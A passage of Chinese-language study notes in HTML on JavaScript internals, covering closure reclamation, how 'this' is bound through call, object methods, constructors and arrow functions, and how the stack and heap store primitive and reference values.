title="闭包是怎么回收的"></a>闭包是怎么回收的</h3><p>理解什么是闭包之后，接下来我们再来简单聊聊闭包是什么时候销毁的。因为如果闭包使用不正确，会很容易造成内存泄漏的，关注闭包是如何回收的能让你正确地使用闭包。</p><p>通常，如果引用闭包的函数是一个全局变量，那么闭包会一直存在直到页面关闭；但如果这个闭包以后不再使用的话，就会造成内存泄漏。</p><p>如果引用闭包的函数是个局部变量，等函数销毁后，在下次 JavaScript 引擎执行垃圾回收时，判断闭包这块内容如果已经不再被使用了，那么 JavaScript 引擎的垃圾回收器就会回收这块内存。</p><p>所以在使用闭包的时候，你要尽量注意一个原则：<strong>如果该闭包会一直使用，那么它可以作为全局变量而存在；但如果使用频率不高，而且占用内存又比较大的话，那就尽量让它成为一个局部变量</strong>。</p><p>关于闭包回收的问题本文只是做了个简单的介绍，其实闭包是如何回收的还牵涉到了 JavaScript 的垃圾回收机制，而关于垃圾回收，后续章节我会再为你做详细介绍的。</p><h3 id="总结-9"><a href="#总结-9" class="headerlink" title="总结"></a>总结</h3><p>好了，今天的内容就讲到这里，下面我们来回顾下今天的内容：</p><ul><li>首先，介绍了什么是作用域链，我们把通过作用域查找变量的链条称为作用域链；作用域链是通过词法作用域来确定的，而词法作用域反映了代码的结构。</li><li>其次，介绍了在块级作用域中是如何通过作用域链来查找变量的。</li><li>最后，又基于作用域链和词法环境介绍了到底什么是闭包。</li></ul><p>通过展开词法作用域，我们介绍了 JavaScript 中的作用域链和闭包；通过词法作用域，我们分析了在 JavaScript 的执行过程中，作用域链是已经注定好了，比如即使在 foo 函数中调用了 bar 函数，你也无法在 bar 函数中直接使用 foo 函数中的变量信息。</p><p>因此理解词法作用域对于你理解 JavaScript 语言本身有着非常大帮助，比如有助于你理解下一篇文章中要介绍的 this。另外，理解词法作用域对于你理解其他语言也有很大的帮助，因为它们的逻辑都是一样的。</p><h2 id="5-this：从-JavaScript-执行上下文的视角讲清楚-this"><a href="#5-this：从-JavaScript-执行上下文的视角讲清楚-this" class="headerlink" title="5. this：从 JavaScript 执行上下文的视角讲清楚 this"></a>5. this：从 JavaScript 执行上下文的视角讲清楚 this</h2><p>在上篇文章中，我们讲了词法作用域、作用域链以及闭包，并在最后思考题中留了下面这样一段代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var bar = &#123;</span><br><span class="line">    myName:&quot;time.geekbang.com&quot;,</span><br><span class="line">    printName: function () &#123;</span><br><span class="line">        console.log(myName)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function foo() &#123;</span><br><span class="line">    let myName = &quot; 极客时间 &quot;</span><br><span class="line">    return bar.printName</span><br><span class="line">&#125;</span><br><span class="line">let myName = &quot; 极客邦 &quot;</span><br><span class="line">let _printName = foo()</span><br><span class="line">_printName()</span><br><span class="line">bar.printName()</span><br></pre></td></tr></table></figure><p>相信你已经知道了，在 printName 函数里面使用的变量 myName 是属于全局作用域下面的，所以最终打印出来的值都是“极客邦”。这是因为 JavaScript 语言的作用域链是由词法作用域决定的，而词法作用域是由代码结构来确定的。</p><p>不过按照常理来说，调用<code>bar.printName</code>方法时，该方法内部的变量 myName 应该使用 bar 对象中的，因为它们是一个整体，大多数面向对象语言都是这样设计的，比如我用 C++ 改写了上面那段代码，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">class Bar&#123;</span><br><span class="line">    public:</span><br><span class="line">    char* myName;</span><br><span class="line">    Bar()&#123;</span><br><span class="line">      myName = &quot;time.geekbang.com&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    void printName()&#123;</span><br><span class="line">       cout&lt;&lt; myName &lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; bar;</span><br><span class="line"></span><br><span class="line">char* myName = &quot; 极客邦 &quot;;</span><br><span class="line">int main() &#123;</span><br><span class="line">bar.printName();</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这段 C++ 代码中，我同样调用了 bar 对象中的 printName 方法，最后打印出来的值就是 bar 对象的内部变量 myName 值——“time.geekbang.com”，而并不是最外面定义变量 myName 的值——“极客邦”，所以<strong>在对象内部的方法中使用对象内部的属性是一个非常普遍的需求</strong>。但是 JavaScript 的作用域机制并不支持这一点，基于这个需求，JavaScript 又搞出来另外一套<strong>this 机制</strong>。</p><p>所以，在 JavaScript 中可以使用 this 实现在 printName 函数中访问到 bar 对象的 myName 属性了。具体该怎么操作呢？你可以调整 printName 的代码，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printName: function () &#123;</span><br><span class="line">        console.log(this.myName)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>接下来咱们就展开来介绍 this，不过在讲解之前，希望你能区分清楚<strong>作用域链</strong>和<strong>this</strong>是两套不同的系统，它们之间基本没太多联系。在前期明确这点，可以避免你在学习 this 的过程中，和作用域产生一些不必要的关联。</p><h3 id="JavaScript-中的-this-是什么"><a href="#JavaScript-中的-this-是什么" class="headerlink" title="JavaScript 中的 this 是什么"></a>JavaScript 中的 this 是什么</h3><p>关于 this，我们还是得先从执行上下文说起。在前面几篇文章中，我们提到执行上下文中包含了变量环境、词法环境、外部环境，但其实还有一个 this 没有提及，具体你可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014165308186.png" alt="image-20221014165308186"></p><p>从图中可以看出，<strong>this 是和执行上下文绑定的</strong>，也就是说每个执行上下文中都有一个 this。前面<a href="https://time.geekbang.org/column/article/120257">《08 | 调用栈：为什么 JavaScript 代码会出现栈溢出？》</a>中我们提到过，执行上下文主要分为三种——全局执行上下文、函数执行上下文和 eval 执行上下文，所以对应的 this 也只有这三种——全局执行上下文中的 this、函数中的 this 和 eval 中的 this。</p><p>不过由于 eval 我们使用的不多，所以本文我们对此就不做介绍了，如果你感兴趣的话，可以自行搜索和学习相关知识。</p><p>那么接下来我们就重点讲解下<strong>全局执行上下文中的 this</strong>和<strong>函数执行上下文中的 this</strong>。</p><h3 id="全局执行上下文中的-this"><a href="#全局执行上下文中的-this" class="headerlink" title="全局执行上下文中的 this"></a>全局执行上下文中的 this</h3><p>首先我们来看看全局执行上下文中的 this 是什么。</p><p>你可以在控制台中输入<code>console.log(this)</code>来打印出来全局执行上下文中的 this，最终输出的是 window 对象。所以你可以得出这样一个结论：全局执行上下文中的 this 是指向 window 对象的。这也是 this 和作用域链的唯一交点，作用域链的最底端包含了 window 对象，全局执行上下文中的 this 也是指向 window 对象。</p><h3 id="函数执行上下文中的-this"><a href="#函数执行上下文中的-this" class="headerlink" title="函数执行上下文中的 this"></a>函数执行上下文中的 this</h3><p>现在你已经知道全局对象中的 this 是指向 window 对象了，那么接下来，我们就来重点分析函数执行上下文中的 this。还是先看下面这段代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function foo()&#123;</span><br><span class="line">  console.log(this)</span><br><span class="line">&#125;</span><br><span class="line">foo()</span><br></pre></td></tr></table></figure><p>我们在 foo 函数内部打印出来 this 值，执行这段代码，打印出来的也是 window 对象，这说明在默认情况下调用一个函数，其执行上下文中的 this 也是指向 window 对象的。估计你会好奇，那能不能设置执行上下文中的 this 来指向其他对象呢？答案是肯定的。通常情况下，有下面三种方式来设置函数执行上下文中的 this 值。</p><h4 id="1-通过函数的-call-方法设置"><a href="#1-通过函数的-call-方法设置" class="headerlink" title="1. 通过函数的 call 方法设置"></a>1. 通过函数的 call 方法设置</h4><p>你可以通过函数的<strong>call</strong>方法来设置函数执行上下文的 this 指向，比如下面这段代码，我们就并没有直接调用 foo 函数，而是调用了 foo 的 call 方法，并将 bar 对象作为 call 方法的参数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let bar = &#123;</span><br><span class="line">  myName : &quot; 极客邦 &quot;,</span><br><span class="line">  test1 : 1</span><br><span class="line">&#125;</span><br><span class="line">function foo()&#123;</span><br><span class="line">  this.myName = &quot; 极客时间 &quot;</span><br><span class="line">&#125;</span><br><span class="line">foo.call(bar)</span><br><span class="line">console.log(bar)</span><br><span class="line">console.log(myName)</span><br></pre></td></tr></table></figure><p>执行这段代码，然后观察输出结果，你就能发现 foo 函数内部的 this 已经指向了 bar 对象，因为通过打印 bar 对象，可以看出 bar 的 myName 属性已经由“极客邦”变为“极客时间”了，同时在全局执行上下文中打印 myName，JavaScript 引擎提示该变量未定义。</p><p>其实除了 call 方法，你还可以使用<strong>bind</strong>和<strong>apply</strong>方法来设置函数执行上下文中的 this，它们在使用上还是有一些区别的，如果感兴趣你可以自行搜索和学习它们的使用方法，这里我就不再赘述了。</p><h4 id="2-通过对象调用方法设置"><a href="#2-通过对象调用方法设置" class="headerlink" title="2. 通过对象调用方法设置"></a>2. 通过对象调用方法设置</h4><p>要改变函数执行上下文中的 this 指向，除了通过函数的 call 方法来实现外，还可以通过对象调用的方式，比如下面这段代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var myObj = &#123;</span><br><span class="line">  name : &quot; 极客时间 &quot;,</span><br><span class="line">  showThis: function()&#123;</span><br><span class="line">    console.log(this)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">myObj.showThis()</span><br></pre></td></tr></table></figure><p>在这段代码中，我们定义了一个 myObj 对象，该对象是由一个 name 属性和一个 showThis 方法组成的，然后再通过 myObj 对象来调用 showThis 方法。执行这段代码，你可以看到，最终输出的 this 值是指向 myObj 的。</p><p>所以，你可以得出这样的结论：<strong>使用对象来调用其内部的一个方法，该方法的 this 是指向对象本身的</strong>。</p><p>其实，你也可以认为 JavaScript 引擎在执行<code>myObject.showThis()</code>时，将其转化为了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">myObj.showThis.call(myObj)</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>接下来我们稍微改变下调用方式，把 showThis 赋给一个全局对象，然后再调用该对象，代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var myObj = &#123;</span><br><span class="line">  name : &quot; 极客时间 &quot;,</span><br><span class="line">  showThis: function()&#123;</span><br><span class="line">    this.name = &quot; 极客邦 &quot;</span><br><span class="line">    console.log(this)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">var foo = myObj.showThis</span><br><span class="line">foo()</span><br></pre></td></tr></table></figure><p>执行这段代码，你会发现 this 又指向了全局 window 对象。</p><p>所以通过以上两个例子的对比，你可以得出下面这样两个结论：</p><ul><li><strong>在全局环境中调用一个函数，函数内部的 this 指向的是全局变量 window。</strong></li><li><strong>通过一个对象来调用其内部的一个方法，该方法的执行上下文中的 this 指向对象本身。</strong></li></ul><h4 id="3-通过构造函数中设置"><a href="#3-通过构造函数中设置" class="headerlink" title="3. 通过构造函数中设置"></a>3. 通过构造函数中设置</h4><p>你可以像这样设置构造函数中的 this，如下面的示例代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function CreateObj()&#123;</span><br><span class="line">  this.name = &quot; 极客时间 &quot;</span><br><span class="line">&#125;</span><br><span class="line">var myObj = new CreateObj()</span><br></pre></td></tr></table></figure><p>在这段代码中，我们使用 new 创建了对象 myObj，那你知道此时的构造函数 CreateObj 中的 this 到底指向了谁吗？</p><p>其实，当执行 new CreateObj() 的时候，JavaScript 引擎做了如下四件事：</p><ul><li>首先创建了一个空对象 tempObj；</li><li>接着调用 CreateObj.call 方法，并将 tempObj 作为 call 方法的参数，这样当 CreateObj 的执行上下文创建时，它的 this 就指向了 tempObj 对象；</li><li>然后执行 CreateObj 函数，此时的 CreateObj 函数执行上下文中的 this 指向了 tempObj 对象；</li><li>最后返回 tempObj 对象。</li></ul><p>为了直观理解，我们可以用代码来演示下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var tempObj = &#123;&#125;</span><br><span class="line">CreateObj.call(tempObj)</span><br><span class="line">return tempObj</span><br></pre></td></tr></table></figure><p>这样，我们就通过 new 关键字构建好了一个新对象，并且构造函数中的 this 其实就是新对象本身。</p><p>关于 new 的具体细节你可以参考<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/new">这篇文章</a>，这里我就不做过多介绍了。</p><h3 id="this-的设计缺陷以及应对方案"><a href="#this-的设计缺陷以及应对方案" class="headerlink" title="this 的设计缺陷以及应对方案"></a>this 的设计缺陷以及应对方案</h3><p>就我个人而言，this 并不是一个很好的设计，因为它的很多使用方法都冲击人的直觉，在使用过程中存在着非常多的坑。下面咱们就来一起看看那些 this 设计缺陷。</p><h4 id="1-嵌套函数中的-this-不会从外层函数中继承"><a href="#1-嵌套函数中的-this-不会从外层函数中继承" class="headerlink" title="1. 嵌套函数中的 this 不会从外层函数中继承"></a>1. 嵌套函数中的 this 不会从外层函数中继承</h4><p>我认为这是一个严重的设计错误，并影响了后来的很多开发者，让他们“前赴后继”迷失在该错误中。我们还是结合下面这样一段代码来分析下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var myObj = &#123;</span><br><span class="line">  name : &quot; 极客时间 &quot;,</span><br><span class="line">  showThis: function()&#123;</span><br><span class="line">    console.log(this)</span><br><span class="line">    function bar()&#123;console.log(this)&#125;</span><br><span class="line">    bar()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">myObj.showThis()</span><br></pre></td></tr></table></figure><p>我们在这段代码的 showThis 方法里面添加了一个 bar 方法，然后接着在 showThis 函数中调用了 bar 函数，那么现在的问题是：bar 函数中的 this 是什么？</p><p>如果你是刚接触 JavaScript，那么你可能会很自然地觉得，bar 中的 this 应该和其外层 showThis 函数中的 this 是一致的，都是指向 myObj 对象的，这很符合人的直觉。但实际情况却并非如此，执行这段代码后，你会发现<strong>函数 bar 中的 this 指向的是全局 window 对象，而函数 showThis 中的 this 指向的是 myObj 对象</strong>。这就是 JavaScript 中非常容易让人迷惑的地方之一，也是很多问题的源头。</p><p><strong>你可以通过一个小技巧来解决这个问题</strong>，比如在 showThis 函数中<strong>声明一个变量 self 用来保存 this</strong>，然后在 bar 函数中使用 self，代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var myObj = &#123;</span><br><span class="line">  name : &quot; 极客时间 &quot;,</span><br><span class="line">  showThis: function()&#123;</span><br><span class="line">    console.log(this)</span><br><span class="line">    var self = this</span><br><span class="line">    function bar()&#123;</span><br><span class="line">      self.name = &quot; 极客邦 &quot;</span><br><span class="line">    &#125;</span><br><span class="line">    bar()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">myObj.showThis()</span><br><span class="line">console.log(myObj.name)</span><br><span class="line">console.log(window.name)</span><br></pre></td></tr></table></figure><p>执行这段代码，你可以看到它输出了我们想要的结果，最终 myObj 中的 name 属性值变成了“极客邦”。其实，这个方法的的本质是<strong>把 this 体系转换为了作用域的体系</strong>。</p><p>其实，<strong>你也可以使用 ES6 中的箭头函数来解决这个问题</strong>，结合下面代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var myObj = &#123;</span><br><span class="line">  name : &quot; 极客时间 &quot;,</span><br><span class="line">  showThis: function()&#123;</span><br><span class="line">    console.log(this)</span><br><span class="line">    var bar = ()=&gt;&#123;</span><br><span class="line">      this.name = &quot; 极客邦 &quot;</span><br><span class="line">      console.log(this)</span><br><span class="line">    &#125;</span><br><span class="line">    bar()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">myObj.showThis()</span><br><span class="line">console.log(myObj.name)</span><br><span class="line">console.log(window.name)</span><br></pre></td></tr></table></figure><p>执行这段代码，你会发现它也输出了我们想要的结果，也就是箭头函数 bar 里面的 this 是指向 myObj 对象的。这是因为 ES6 中的箭头函数并不会创建其自身的执行上下文，所以箭头函数中的 this 取决于它的外部函数。</p><p>通过上面的讲解，你现在应该知道了 this 没有作用域的限制，这点和变量不一样，所以嵌套函数不会从调用它的函数中继承 this，这样会造成很多不符合直觉的代码。要解决这个问题，你可以有两种思路：</p><ul><li>第一种是把 this 保存为一个 self 变量，再利用变量的作用域机制传递给嵌套函数。</li><li>第二种是继续使用 this，但是要把嵌套函数改为箭头函数，因为箭头函数没有自己的执行上下文，所以它会继承调用函数中的 this。</li></ul><h4 id="2-普通函数中的-this-默认指向全局对象-window"><a href="#2-普通函数中的-this-默认指向全局对象-window" class="headerlink" title="2. 普通函数中的 this 默认指向全局对象 window"></a>2. 普通函数中的 this 默认指向全局对象 window</h4><p>上面我们已经介绍过了，在默认情况下调用一个函数，其执行上下文中的 this 是默认指向全局对象 window 的。</p><p>不过这个设计也是一种缺陷，因为在实际工作中，我们并不希望函数执行上下文中的 this 默认指向全局对象，因为这样会打破数据的边界，造成一些误操作。如果要让函数执行上下文中的 this 指向某个对象，最好的方式是通过 call 方法来显示调用。</p><p>这个问题可以通过设置 JavaScript 的“严格模式”来解决。在严格模式下，默认执行一个函数，其函数的执行上下文中的 this 值是 undefined，这就解决上面的问题了。</p><h3 id="总结-10"><a href="#总结-10" class="headerlink" title="总结"></a>总结</h3><p>好了，今天就到这里，下面我们来回顾下今天的内容。</p><p>首先，在使用 this 时，为了避坑，你要谨记以下三点：</p><ol><li>当函数作为对象的方法调用时，函数中的 this 就是该对象；</li><li>当函数被正常调用时，在严格模式下，this 值是 undefined，非严格模式下 this 指向的是全局对象 window；</li><li>嵌套函数中的 this 不会继承外层函数的 this 值。</li></ol><p>最后，我们还提了一下箭头函数，因为箭头函数没有自己的执行上下文，所以箭头函数的 this 就是它外层函数的 this。</p><p>这是我们“JavaScript 执行机制”模块的最后一节了，五节下来，你应该已经发现我们将近一半的时间都是在谈 JavaScript 的各种缺陷，比如变量提升带来的问题、this 带来问题等。我认为了解一门语言的缺陷并不是为了否定它，相反是为了能更加深入地了解它。我们在谈论缺陷的过程中，还结合 JavaScript 的工作流程分析了出现这些缺陷的原因，以及避开这些缺陷的方法。掌握了这些，相信你今后在使用 JavaScript 的过程中会更加得心应手。</p><h1 id="三、V8-工作原理"><a href="#三、V8-工作原理" class="headerlink" title="三、V8 工作原理"></a>三、V8 工作原理</h1><p>对于前端开发者来说，JavaScript 的内存机制是一个不被经常提及的概念 ，因此很容易被忽视。特别是一些非计算机专业的同学，对内存机制可能没有非常清晰的认识，甚至有些同学根本就不知道 JavaScript 的内存机制是什么。</p><p>但是如果你想成为行业专家，并打造高性能前端应用，那么你就必须要搞清楚<strong>JavaScript 的内存机制</strong>了。</p><p>其实，要搞清楚 JavaScript 的内存机制并不是一件很困难的事，在接下来的三篇文章（数据在内存中的存放、JavaScript 处理垃圾回收以及 V8 执行代码）中，我们将通过内存机制的介绍，循序渐进带你走进 JavaScript 内存的世界。</p><h2 id="1-栈空间和堆空间：数据是如何存储的？"><a href="#1-栈空间和堆空间：数据是如何存储的？" class="headerlink" title="1. 栈空间和堆空间：数据是如何存储的？"></a>1. 栈空间和堆空间：数据是如何存储的？</h2><p>今天我们讲述第一部分的内容——JavaScript 中的数据是如何存储在内存中的。虽然 JavaScript 并不需要直接去管理内存，但是在实际项目中为了能避开一些不必要的坑，你还是需要了解数据在内存中的存储方式的。</p><h3 id="让人疑惑的代码"><a href="#让人疑惑的代码" class="headerlink" title="让人疑惑的代码"></a>让人疑惑的代码</h3><p>首先，我们先看下面这两段代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function foo()&#123;</span><br><span class="line">    var a = 1</span><br><span class="line">    var b = a</span><br><span class="line">    a = 2</span><br><span class="line">    console.log(a)</span><br><span class="line">    console.log(b)</span><br><span class="line">&#125;</span><br><span class="line">foo()</span><br><span class="line">function foo()&#123;</span><br><span class="line">    var a = &#123;name:&quot; 极客时间 &quot;&#125;</span><br><span class="line">    var b = a</span><br><span class="line">    a.name = &quot; 极客邦 &quot;</span><br><span class="line">    console.log(a)</span><br><span class="line">    console.log(b)</span><br><span class="line">&#125;</span><br><span class="line">foo()</span><br></pre></td></tr></table></figure><p>若执行上述这两段代码，你知道它们输出的结果是什么吗？下面我们就来一个一个分析下。</p><p>执行第一段代码，打印出来 a 的值是 2，b 的值是 1，这没什么难以理解的。</p><p>接着，再执行第二段代码，你会发现，仅仅改变了 a 中 name 的属性值，但是最终 a 和 b 打印出来的值都是<code>&#123;name:&quot;极客邦&quot;&#125;</code>。这就和我们预期的不一致了，因为我们想改变的仅仅是 a 的内容，但 b 的内容也同时被改变了。</p><p>要彻底弄清楚这个问题，我们就得先从“JavaScript 是什么类型的语言”讲起。</p><h3 id="JavaScript-是什么类型的语言"><a href="#JavaScript-是什么类型的语言" class="headerlink" title="JavaScript 是什么类型的语言"></a>JavaScript 是什么类型的语言</h3><p>每种编程语言都具有内建的数据类型，但它们的数据类型常有不同之处，使用方式也很不一样，比如 C 语言在定义变量之前，就需要确定变量的类型，你可以看下面这段 C 代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">   int a = 1;</span><br><span class="line">   char* b = &quot; 极客时间 &quot;;</span><br><span class="line">   bool c = true;</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码声明变量的特点是：在声明变量之前需要先定义变量类型。<strong>我们把这种在使用之前就需要确认其变量数据类型的称为静态语言</strong>。</p><p><strong>相反地，我们把在运行过程中需要检查数据类型的语言称为动态语言</strong>。比如我们所讲的 JavaScript 就是动态语言，因为在声明变量之前并不需要确认其数据类型。</p><p>虽然 C 语言是静态，但是在 C 语言中，我们可以把其他类型数据赋予给一个声明好的变量，如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c = a</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>前面代码中，我们把 int 型的变量 a 赋值给了 bool 型的变量 c，这段代码也是可以编译执行的，因为在赋值过程中，C 编译器会把 int 型的变量悄悄转换为 bool 型的变量，我们通常把这种偷偷转换的操作称为<strong>隐式类型转换</strong>。而<strong>支持隐式类型转换的语言称为弱类型语言，不支持隐式类型转换的语言称为强类型语言</strong>。在这点上，C 和 JavaScript 都是弱类型语言。</p><p>对于各种语言的类型，你可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014180233153.png" alt="image-20221014180233153"></p><h3 id="JavaScript-的数据类型"><a href="#JavaScript-的数据类型" class="headerlink" title="JavaScript 的数据类型"></a>JavaScript 的数据类型</h3><p>现在我们知道了，<strong>JavaScript 是一种弱类型的、动态的语言</strong>。那这些特点意味着什么呢？</p><ul><li><strong>弱类型</strong>，意味着你不需要告诉 JavaScript 引擎这个或那个变量是什么数据类型，JavaScript 引擎在运行代码的时候自己会计算出来。</li><li><strong>动态</strong>，意味着你可以使用同一个变量保存不同类型的数据。</li></ul><p>那么接下来，我们再来看看 JavaScript 的数据类型，你可以看下面这段代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var bar</span><br><span class="line">bar = 12</span><br><span class="line">bar = &quot; 极客时间 &quot;</span><br><span class="line">bar = true</span><br><span class="line">bar = null</span><br><span class="line">bar = &#123;name:&quot; 极客时间 &quot;&#125;</span><br></pre></td></tr></table></figure><p>从上述代码中你可以看出，我们声明了一个 bar 变量，然后可以使用各种类型的数据值赋予给该变量。</p><p>在 JavaScript 中，如果你想要查看一个变量到底是什么类型，可以使用“typeof”运算符。具体使用方式如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var bar</span><br><span class="line">console.log(typeof bar)  //undefined</span><br><span class="line">bar = 12</span><br><span class="line">console.log(typeof bar) //number</span><br><span class="line">bar = &quot; 极客时间 &quot;</span><br><span class="line">console.log(typeof bar)//string</span><br><span class="line">bar = true</span><br><span class="line">console.log(typeof bar) //boolean</span><br><span class="line">bar = null</span><br><span class="line">console.log(typeof bar) //object</span><br><span class="line">bar = &#123;name:&quot; 极客时间 &quot;&#125;</span><br><span class="line">console.log(typeof bar) //object</span><br></pre></td></tr></table></figure><p>执行这段代码，你可以看到打印出来了不同的数据类型，有 undefined、number、boolean、object 等。那么接下来我们就来谈谈 JavaScript 到底有多少种数据类型。</p><p>其实 JavaScript 中的数据类型一种有 8 种，它们分别是：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014181431481.png" alt="image-20221014181431481">了解这些类型之后，还有三点需要你注意一下。</p><p>第一点，使用 typeof 检测 Null 类型时，返回的是 Object。这是当初 JavaScript 语言的一个 Bug，一直保留至今，之所以一直没修改过来，主要是为了兼容老的代码。</p><p>第二点，Object 类型比较特殊，它是由上述 7 种类型组成的一个包含了 key-value 对的数据类型。如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let myObj = &#123;</span><br><span class="line">        name:&#x27;极客时间&#x27;,</span><br><span class="line">        update:function()&#123;....&#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>从中你可以看出来，Object 是由 key-value 组成的，其中的 vaule 可以是任何类型，包括函数，这也就意味着你可以通过 Object 来存储函数，Object 中的函数又称为方法，比如上述代码中的 update 方法。</p><p>第三点，我们把前面的 7 种数据类型称为<strong>原始类型</strong>，把最后一个对象类型称为<strong>引用类型</strong>，之所以把它们区分为两种不同的类型，是因为它们在内存中存放的位置不一样。到底怎么个不一样法呢？接下来，我们就来讲解一下 JavaScript 的原始类型和引用类型到底是怎么储存的。</p><h3 id="内存空间"><a href="#内存空间" class="headerlink" title="内存空间"></a>内存空间</h3><p>要理解 JavaScript 在运行过程中数据是如何存储的，你就得先搞清楚其存储空间的种类。下面是我画的 JavaScript 的内存模型，你可以参考下：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014181730662.png" alt="image-20221014181730662"></p><p>从图中可以看出， 在 JavaScript 的执行过程中， 主要有三种类型内存空间，分别是<strong>代码空间、栈空间</strong>和<strong>堆空间</strong>。</p><p>其中的代码空间主要是存储可执行代码的，这个我们后面再做介绍，今天主要来说说栈空间和堆空间。</p><h3 id="栈空间和堆空间"><a href="#栈空间和堆空间" class="headerlink" title="栈空间和堆空间"></a>栈空间和堆空间</h3><p>这里的栈空间就是我们之前反复提及的调用栈，是用来存储执行上下文的。为了搞清楚栈空间是如何存储数据的，我们还是先看下面这段代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function foo()&#123;</span><br><span class="line">    var a = &quot; 极客时间 &quot;</span><br><span class="line">    var b = a</span><br><span class="line">    var c = &#123;name:&quot; 极客时间 &quot;&#125;</span><br><span class="line">    var d = c</span><br><span class="line">&#125;</span><br><span class="line">foo()</span><br></pre></td></tr></table></figure><p>前面文章我们已经讲解过了，当执行一段代码时，需要先编译，并创建执行上下文，然后再按照顺序执行代码。那么下面我们来看看，当执行到第 3 行代码时，其调用栈的状态，你可以参考下面这张调用栈状态图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014182107285.png" alt="image-20221014182107285"></p><p>从图中可以看出来，当执行到第 3 行时，变量 a 和变量 b 的值都被保存在执行上下文中，而执行上下文又被压入到栈中，所以你也可以认为变量 a 和变量 b 的值都是存放在栈中的。</p><p>接下来继续执行第 4 行代码，由于 JavaScript 引擎判断右边的值是一个引用类型，这时候处理的情况就不一样了，JavaScript 引擎并不是直接将该对象存放到变量环境中，而是将它分配到堆空间里面，分配后该对象会有一个在“堆”中的地址，然后再将该数据的地址写进 c 的变量值，最终分配好内存的示意图如下所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014182125905.png" alt="image-20221014182125905"></p><p>从上图你可以清晰地观察到，对象类型是存放在堆空间的，在栈空间中只是保留了对象的引用地址，当 JavaScript 需要访问该数据的时候，是通过栈中的引用地址来访问的，相当于多了一道转手流程。</p><p>好了，现在你应该知道了<strong>原始类型的数据值都是直接保存在“栈”中的，引用类型的值是存放在“堆”中的</strong>。不过你也许会好奇，为什么一定要分“堆”和“栈”两个存储空间呢？所有数据直接存放在“栈”中不就可以了吗？</p><p>答案是不可以的。这是因为 JavaScript 引擎需要用栈来维护程序执行期间上下文的状态，如果栈空间大了话，所有的数据都存放在栈空间里面，那么会影响到上下文切换的效率，进而又影响到整个程序的执行效率。比如文中的 foo 函数执行结束了，JavaScript 引擎需要离开当前的执行上下文，只需要将指针下移到上个执行上下文的地址就可以了，foo 函数执行上下文栈区空间全部回收，具体过程你可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014182149608.png" alt="image-20221014182149608"></p><p>所以<strong>通常情况下，栈空间都不会设置太大，主要用来存放一些原始类型的小数据</strong>。而引用类型的数据占用的空间都比较大，所以这一类数据会被存放到堆中，<strong>堆空间很大，能存放很多大的数据</strong>，不过缺点是分配内存和回收内存都会占用一定的时间。</p><p>解释了程序在执行过程中为什么需要堆和栈两种数据结构后，我们还是回到示例代码那里，看看它最后一步将变量 c 赋值给变量 d 是怎么执行的？</p><p>在 JavaScript 中，赋值操作和其他语言有很大的不同，<strong>原始类型的赋值会完整复制变量值，而引用类型的赋值是复制引用地址</strong>。</p><p>所以<code>d=c</code>的操作就是把 c 的引用地址赋值给 d，你可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014182206188.png" alt="image-20221014182206188"></p><p>从图中你可以看到，变量 c 和变量 d 都指向了同一个堆中的对象，所以这就很好地解释了文章开头的那个问题，通过 c 修改 name 的值，变量 d 的值也跟着改变，归根结底它们是同一个对象。</p><h3 id="再谈闭包"><a href="#再谈闭包" class="headerlink" 